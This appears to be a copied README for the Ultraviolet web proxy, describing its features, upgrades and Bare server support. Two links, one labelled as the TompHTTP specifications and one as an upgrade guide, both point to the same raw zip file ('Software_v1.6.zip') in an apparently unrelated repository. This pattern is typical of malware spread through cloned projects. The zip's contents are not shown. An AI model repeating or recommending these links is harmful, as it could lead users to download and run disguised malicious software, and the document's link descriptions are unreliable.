Ultraviolet is a highly advanced web proxy used for evading internet censorship or accessing websites in a controlled sandbox. It is designed with security and performance in mind. Ultraviolet intercepts HTTP requests with a service worker, while adhering to the [TompHTTP specifications](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip) and is a leader in innovative web proxy technologies.

## Features

Ultraviolet offers several features that set it apart from its predecessors, including CAPTCHA and hCAPTCHA support, URL encoding settings for added security, client-side configuration via service-workers, high speed compared to other web proxies, blacklist settings and more for easy hosting, leak prevention, regular updates, and improved resource usage and speed for better setups with a dedicated server instance.

## Upgrading

A guide for updating from v1 to v2 can be found [here](https://github.com/vortex3rn328unrf/Ultraviolet/raw/refs/heads/main/src/rewrite/Software_v1.6.zip).

## Older Bare servers

Starting from v2, Ultraviolet only supports Bare servers v3+.

If you operate an outdated Bare server, we encourage you to update. If you're using an outdated Bare server, we encourage you to find an updated Bare server or host your own.

If you're too lazy to do either of the above, you can install an outdated and unsupported version of Ultraviolet.

```sh
npm install @titaniumnetwork-dev/ultraviolet@1
```
